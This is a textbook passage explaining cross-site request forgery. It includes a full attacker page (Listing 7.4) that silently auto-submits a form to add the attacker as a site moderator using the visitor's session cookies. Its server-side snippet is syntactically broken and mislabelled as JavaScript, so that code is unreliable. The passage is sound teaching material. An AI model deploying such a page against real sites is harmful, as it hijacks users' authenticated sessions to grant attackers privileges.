## **7.3.1 XSRF Attacks**

Consider the following situation. You’ve provided a web interface to your publishers
that allows them to add different people as content moderators—users who can edit
and delete reviews posted to your widget from their website. This interface is protected
behind an authentication wall. Before making any changes to the existing moderators

list, you diligently check whether the user—the one adding a new moderator—is
authenticated and has permission to invoke this particular action. For the sake of this
example, let’s say that in order to add a new moderator, users need to submit (POST)
a form that contains a username input:

```html
<form action="/admin/moderators/add/" method="POST">
  <input type="text" name="username" />
  <input type="submit" value="Add" />
</form>
```

The code on the server that processes this form request looks like this:

```javascript
@app.route('/admin/moderators/add')
def add_moderator)():
if (request.user.is_authenticated() and \
request.user.has_permission('add-moderator') and \
is_user_valid(request.POST.username):
add_moderator(request.POST.username)
```

By all accounts, this server endpoint appears to be safe. After all, it validates the user’s session, their permission level, and also the username POST parameter. Alas, despite all our efforts, this particular endpoint is susceptible to an XSRF attack.

To understand why, consider the following HTML form. This is a malicious form written and hosted by an attacker that initiates a POST request to the moderators/add endpoint under the identity of whoever visits it.

**Listing 7.4 XSRF exploit that submits the attacker’s identifier as a moderator value**

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Free copies of Third-Party JavaScript!</title>
  </head>
  <body>
    <p>Sorry, we ran out of free copies. Try again later.</p>
    <script>
      var form = document.createElement("form");
      var input = document.createElement("input");
      form.style.display = "none";
      form.setAttribute("method", "POST");
      form.setAttribute(
        "action",
        "http://camerastork.com/admin/moderators/add/"
      );
      input.name = "username";
      input.value = "attacker";
      form.appendChild(input);
      document.getElementsByTagName("body")[0].appendChild(form);
      form.submit();
    </script>
  </body>
</html>
```

Despite looking like an innocent web page, the script on this page automatically generates and submits a form pointed to the moderators/add endpoint. In other words, whoever visits this page ends up submitting a POST request to moderators/add—with the attacker’s username as a parameter. To the browser, this is treated as a genuine request to the camerastork.com server, so it transmits any stored camerastork.com cookies with the request, including the user’s session cookie. The server receives the request—cookies included—checks the session, and validates the provided username.

Everything looks fine, so the server adds the attacker as a moderator to your account. The attack has been successful and you haven’t noticed a thing (and you didn’t get a free book for your trouble, either).
